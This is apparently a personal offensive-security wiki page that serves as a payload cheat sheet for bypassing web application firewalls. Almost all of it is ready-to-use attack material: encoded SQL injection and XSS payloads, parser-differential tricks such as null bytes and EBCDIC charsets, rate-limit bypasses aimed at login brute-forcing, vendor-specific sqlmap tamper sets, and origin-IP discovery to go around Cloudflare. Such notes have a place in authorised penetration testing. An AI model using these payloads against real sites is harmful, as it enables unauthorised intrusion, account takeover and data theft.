## WAF Bypass Payloads — concrete encodings & mutations (SQLi/XSS/parser)
Companion to [[waf_evasion]] (principle: one hypothesis-driven mutation at a time). This is the payload
table. Core idea for most: exploit a decode/parse DIFFERENTIAL — the WAF and the backend disagree on
what the bytes mean.

Encoding layers (pick the one where the WAF decodes fewer times than the app):
`'` → `%27` (single URL) → `%2527` (double, edge decodes once) → `%25252527` (triple, proxy chain).
XSS ctx: `'` → `'` (JS), `&#39;`/`&#x27;` (HTML entity). Full-width/Unicode → ASCII after NFKD:
`＜img src⁼x onerror⁼alert(1)﹥`, Persian digits `pr۰mpt()` → `pr0mpt()`; backend normalizes post-inspection.

SQLi keyword-filter bypass (comment splits a token the tokenizer expects whole):
inline `UNION/**/SELECT` (also `UN/**/ION SE/**/LECT`), MySQL exec-only `/*!50000SELECT*/` and `/*!UNION*/`, ModSecurity-versioned
`/*!12345AND*/` / `/*!0AND*/`. Case `UnIoN`. Non-recursive (WAF strips once) `uniunionon`, `SELSELECTECT`.
Whitespace → `/**/`, `%09`, `%0a`, `%0b`, `%0c`, `+`, `%a0`. Operator swaps: ` OR `→` || `, ` AND `→` && `,
`=`→` LIKE `, `>`→`NOT BETWEEN 0 AND`, `UNION SELECT`→`UNION ALL SELECT`. GBK magic-quotes `%bf%27`.
Generate all variants: `sqlmap --tamper=space2comment,charencode` (or via sqlmap `--tamper=`, below).

XSS filter bypass: base64 exec wrapper `<svg onload=eval(atob('YWxlcnQoMSk='))>`,
`<img src=x onerror=eval(atob('...'))>`. Junk between tokens to break the tokenizer:
`<script>+-+-1-+-+alert(1)+-+-</script>`, `<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1)>`.
Event vectors `onpointerover`/`onstart`; no-parens; SVG/marquee.

Parser-differential bypass (WAF can't read what the backend can):
- No `Content-Type` header → some WAFs skip body inspection entirely.
- Null byte breaks WAF's JSON tokenizer: `{"user"\x00: "admin' OR '1'='1"}` (WAFFLED 2025, 557 variants).
- Charset the WAF ignores: POST body `Content-Type: ...; charset=ibm037` (EBCDIC) — IIS decodes, WAF doesn't;
  or XML/JSON as `charset=utf-16` — parser decodes, WAF sees garbage.
- Dual/confused `Content-Type`, `text/plain` with JSON body, multipart boundary case drift `boundary=x; BOUNDARY=y`.
- XML DOCTYPE tail junk `...]X>` confuses the WAF XML parser but not the backend.

Rate-limit bypass: vary the key — `/api/v2/login`, `/Login`, `/login/`, `/login%20`, `?x=1`, `#a`;
email counters `victim+1@x.com`, `victim@x.com%00`. Protocol: HTTP/2 multiplexing (Turbo Intruder,
100 reqs/1 TCP conn), GraphQL aliasing (N attempts/1 request), WebSocket flood post-upgrade.

sqlmap tampers by vendor: ModSecurity `--tamper=modsecurityversioned,space2comment,randomcase`;
Cloudflare `space2comment,randomcase,charencode,between`; AWS `between,charencode,chardoubleencode`;
Imperva `randomcase,space2comment,equaltolike`; unknown → throw everything.
Cloudflare-specific: origin-IP discovery (crt.sh / Shodan `ssl.cert.subject.cn:`) to skip the WAF entirely,
plus `Transfer-Encoding: chunked` + `X-Forwarded-Host: localhost`. Discipline: every blocked request is
logged noise — mutate one axis, retry the SAME idea (see [[chains]] filter note), don't spray.
